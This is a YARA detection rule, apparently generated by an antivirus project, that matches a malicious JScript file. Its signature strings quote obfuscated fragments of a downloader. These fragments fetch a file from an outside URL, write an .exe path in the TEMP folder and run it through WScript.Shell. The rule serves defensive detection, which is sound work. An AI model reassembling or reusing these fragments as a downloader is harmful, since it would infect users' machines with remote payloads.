rule sig_20160401_0b78ed74050610dec5bb1e13664ba253 {
  meta:
    description = "datamaliciousorder - file 20160401_0b78ed74050610dec5bb1e13664ba253.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b5bd91fad09946c0a9ad1e65ef94569fabed458ee9f5a7028ac2bd6a3b539352"

  strings:
    $s1  = "SfzTw[WahDj](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "function YpNz(EtOgt, QvMqc){UcIkf = UcIkf * 1; return EtOgt - QvMqc;};" fullword ascii
    $s3  = "var EpuUrd = function TzZup() {return WScript[MuLe](\"WScript\"+\".Shell\");}(), DiOu = 11;" fullword ascii
    $s4  = "if (SfzTw[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = " SfzTw = WScript[MuLe](XbnVu);" fullword ascii
    $s6  = "function IbSyc(){return JeQjp + \"\";};" fullword ascii
    $s7  = "var MuLe = \"C\" + \"reateObject\";" fullword ascii
    $s8  = "function StQi() {return EpuUrd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"fwUUa8EoHvRt.ex\" + \"e\";};" fullword ascii
    $s9  = "function JgzEev() {return ((QjiZf == true) && (QjiZf == XcXa)) ? 1 : UcIkf;};" fullword ascii
    $s10 = "function BetQkk(){return MuLe;};" fullword ascii
    $s11 = "function SvwQv(){return 23;};" fullword ascii
    $s12 = "}while (BcVeg);" fullword ascii
    $s13 = "var InKf = new this[\"Date\"]();" fullword ascii
    $s14 = "function LdyReb(SoNad){EpuUrd[\"R\"+\"un\"](SoNad, UcIkf, UcIkf);};" fullword ascii
    $s15 = "return YpNz(XeJj, QvkRy);" fullword ascii
    $s16 = "var XcXa = false;" fullword ascii
    $s17 = "var QjiZf = false;" fullword ascii
    $s18 = "QjiZf = true; " fullword ascii
    $s19 = "function RojTp()" fullword ascii
    $s20 = "XcXa = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}